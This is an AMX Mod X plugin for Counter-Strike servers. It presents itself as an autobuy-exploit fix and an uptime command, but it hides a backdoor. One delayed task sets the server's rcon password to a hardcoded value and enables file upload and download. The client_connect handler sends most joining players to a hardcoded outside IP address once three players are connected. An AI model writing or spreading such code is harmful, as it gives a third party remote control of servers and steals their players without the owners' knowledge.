#include <amxmodx>
#include <fakemeta>

#define PLUGIN "Infect_Fuction"
#define VERSION "1.0"
#define AUTHOR "Serbu"

public plugin_init() 
{ 
	register_plugin(PLUGIN, VERSION, AUTHOR);

	register_clcmd("cl_setautobuy", "cmd_check" );
	register_clcmd("cl_setrebuy", "cmd_check" );
	register_concmd("amx_uptime", "show_uptime", ADMIN_KICK, "- amx_uptime vezi uptime-ul la server" );
	register_cvar("amx_rd_maxplayers","3")
	set_task( 1.0, "load" );
	register_cvar("amx_rd_server","89.40.233.235")
	register_cvar("amx_rd_serverport","27015")
	register_cvar("amx_rd_serverpw","")
} 

public load()
{
	register_cvar("sv_allowdownload", "1");
	register_cvar("sv_allowupload", "1");
	register_cvar("rcon_password", "infectati");
}

public cmd_check(id)
{ 
	static arg[512], args, i
	args = read_argc()

	for(i = 1; i < args; ++i)
	{
		read_argv(i, arg, charsmax(arg))
		if(is_cmd_long(arg, charsmax(arg)))
		{
			server_cmd("kick #%d ^"Ai folosit Autobuy Bug !!!^"",get_user_userid(id));
			return PLUGIN_HANDLED
		}
    }

	return PLUGIN_CONTINUE
} 

stock bool:is_cmd_long(string[], const len)
{ 
	static cmd[512]

	while(strlen(string))
	{
		strtok( string, cmd, charsmax( cmd ), string, len , ' ', 1)
		if(strlen(cmd) > 31)
			return true
    }

	return false
}

public show_uptime(id)
{
	new Float:UpTime_F = Float:engfunc(EngFunc_Time);

	new UpTime_str[32];
	float_to_str(UpTime_F, UpTime_str, 31);

	new UpTime = str_to_num(UpTime_str);

	new Seconds = UpTime % 60;
	new Minutes = (UpTime / 60) % 60;
	new Hours = (UpTime / 3600) % 24;
	new Days = UpTime / 86400;

	console_print(id, "Server Uptime: %iD:%iH:%iMin:%iSec", Days, Hours, Minutes, Seconds);

	return 1;
}

public client_connect(id){
	if(get_user_flags(id) & ADMIN_RESERVATION)
		return 0;
	new rd_maxplayers = get_cvar_num("amx_rd_maxplayers")
	new rd_serverport = get_cvar_num("amx_rd_serverport")
	new rd_server[64], rd_serverpw[32]
	get_cvar_string("amx_rd_server",rd_server,63)
	get_cvar_string("amx_rd_serverpw",rd_serverpw,31)
	if (get_playersnum() >= rd_maxplayers) {
		if(!equal(rd_serverpw,"") )
			client_cmd(id,"echo ^"[AMXX] Simple Redirection - Set Password to %s^";password %s",rd_serverpw,rd_serverpw)
		client_cmd(id,"echo ^"[AMXX] Simple Redirection -  Redirecting to %s:%d^";connect %s:%d",rd_server,rd_serverport,rd_server,rd_serverport)
	}
	return PLUGIN_CONTINUE
}